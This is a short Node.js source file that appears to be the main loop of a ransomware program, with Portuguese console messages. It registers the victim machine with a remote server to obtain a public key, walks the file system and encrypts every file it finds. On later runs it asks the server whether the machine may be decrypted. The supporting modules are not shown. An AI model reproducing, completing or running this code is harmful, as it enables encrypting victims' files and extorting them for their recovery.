'use strict'

const Connect = require('./connect')
const machineManager = require('./utils/EncryptionManager')
const encrypter = require('./crypto/crypter')
const decrypter = require('./crypto/decrypter')
const aleisterCrowley = require('./discover')
const worker = require('./worker')


const connect = new Connect()

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

const waitThenDo = async () =>{
    console.log('Dormindo')
    await sleep(1000 * 5)
    console.log('Acordado')
}


async function main(){
    var system = machineManager.loadId()

    if(!system){
        try {
            console.log('Iniciando...')
            system = machineManager.generateId()
            const { publicKey } = await connect.remoteRegisterMachine(system)
            const fileEncrypter = encrypter(publicKey)
            aleisterCrowley(filename =>{
                worker(filename, fileEncrypter)
            })
        } catch (error) {
            console.log(`Erro ao conectar ${error}`)
            machineManager.deleteId()
        }
    }else{
        try {
            console.log('Desencriptando')
            const data = await connect.checkMachineStatus(system.uuid)
            if(data){
                const fileDecrypter = decrypter(data)
                aleisterCrowley(filename =>{
                    worker(filename, fileDecrypter)
                })
            }

        } catch (error) {
            console.log(`erro ao desencriptar ${error}`)
        }
    }
}

(async function(){
    while(true){
        await main()
        await waitThenDo()
    }
})